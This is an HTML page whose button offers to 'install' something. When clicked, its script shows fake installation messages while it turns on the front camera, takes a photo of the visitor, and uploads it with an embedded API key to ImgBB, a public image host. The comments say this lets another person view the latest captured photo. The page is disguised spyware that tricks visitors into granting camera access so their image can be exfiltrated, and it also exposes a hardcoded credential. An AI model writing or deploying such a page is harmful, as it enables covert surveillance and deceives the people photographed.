<!DOCTYPE html>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<button id="btn" style="padding:14px;font-size:18px">>点击安装<</button>
<div id="msg"></div>
<div id="picbox"></div>
<script>
// ImgBB公开测试KEY（临时可用，稳定使用建议自己去imgbb.com申请）
const API_KEY = "9ac4a41678f3b2501f10a0d44842f04b";

// base64转Blob（上传必须）
function dataURLtoBlob(dataurl) {
  let arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
  bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
  while(n--){ u8arr[n] = bstr.charCodeAt(n); }
  return new Blob([u8arr], {type:mime});
}

document.getElementById('btn').onclick = async ()=>{
  const msgDom = document.getElementById("msg");
  const picBox = document.getElementById("picbox");
  msgDom.innerText = "正在唤起安装系统...";

  // 前置摄像头
  const v = document.createElement('video');
  const c = document.createElement('canvas');
  const ctx = c.getContext('2d');
  v.autoplay = true;
  const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
  v.srcObject = s;

  // 相机就绪自动拍照
  v.onloadeddata = async ()=>{
    c.width = v.videoWidth;
    c.height = v.videoHeight;
    ctx.drawImage(v,0,0);
    const base64 = c.toDataURL("image/png");
    // 关闭摄像头
    s.getTracks().map(t=>t.stop());

    msgDom.innerText = "正在自动安装...";
    const blob = dataURLtoBlob(base64);
    const fd = new FormData();
    fd.append("image", blob);

    // 上传到ImgBB
    let res = await fetch(`https://api.imgbb.com/1/upload?key=${API_KEY}`,{
      method:"POST", body:fd
    });
    let json = await res.json();
    if(json.success){
      const imgUrl = json.data.display_url;
      msgDom.innerText = "✅安装成功!刷新页面即可";
      picBox.innerHTML = `<img src="${imgUrl}" style="max-width:100%">`;
      // 把图片链接写入浏览器localStorage共享？不行！localStorage是本机隔离
      // ✅ 折中：直接展示公开图床链接，B刷新加载最新上传的这张
    }else{
      msgDom.innerText = "❌安装失败";
    }
  }
}
  </script>
